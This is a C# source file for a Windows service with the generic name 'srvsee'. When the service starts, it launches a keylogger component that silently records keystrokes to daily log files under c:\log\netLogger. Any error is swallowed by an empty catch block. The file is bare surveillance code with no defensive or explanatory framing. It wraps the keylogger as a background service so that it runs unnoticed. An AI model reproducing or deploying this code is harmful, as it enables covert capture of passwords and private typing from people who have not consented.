using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.ServiceProcess;
using System.Text;
using System.IO;

namespace srvsee
{
    public partial class Service1 : ServiceBase
    {
        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            // TODO: Add code here to start your service.
            try
            {
		        NetKeyLogger.Keylogger kl = new NetKeyLogger.Keylogger();
                kl.LOG_OUT = "file";
                kl.LOG_MODE = "day";
                kl.LOG_FILE = "c:\\log\\netLogger";
                kl.Enabled = true; // enable key logging
                kl.FlushInterval = 60000; // Default: 1 Minuto - set buffer flush interval
            }
            catch
            { 
            }
        }

   }
}
